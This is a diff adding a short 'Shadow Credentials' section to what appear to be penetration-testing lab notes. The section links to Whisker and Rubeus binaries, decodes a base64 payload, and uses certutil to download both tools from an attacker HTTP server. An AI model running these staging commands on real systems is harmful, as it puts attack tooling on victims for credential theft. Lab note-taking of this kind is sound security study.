@@ -195,7 +195,21 @@ Analyzing the Shortest Path to unconstrained data systems
 
 ![image](https://user-images.githubusercontent.com/105310322/190872497-68e612ae-0c0a-4b73-a31b-734d86012adb.png)
 
+Shadow Credentials
 
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-Whisker.ps1
+
+└─$ cat whisker.txt | base64 -d > whisker.gz
+                                                                            
+(base) ┌──(rogue1㉿rogue1)-[~/Downloads]
+└─$ gzip -d whisker.gz 
+
+Rubeus.exe can be got here
+
+https://github.com/r3motecontrol/Ghostpack-CompiledBinaries           
+
+certutil -urlcache -f http://10.10.16.8:8000/whisker whisker.exe
+certutil -urlcache -f http://10.10.16.8:8000/rubeus.exe rubeus.exe
 
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
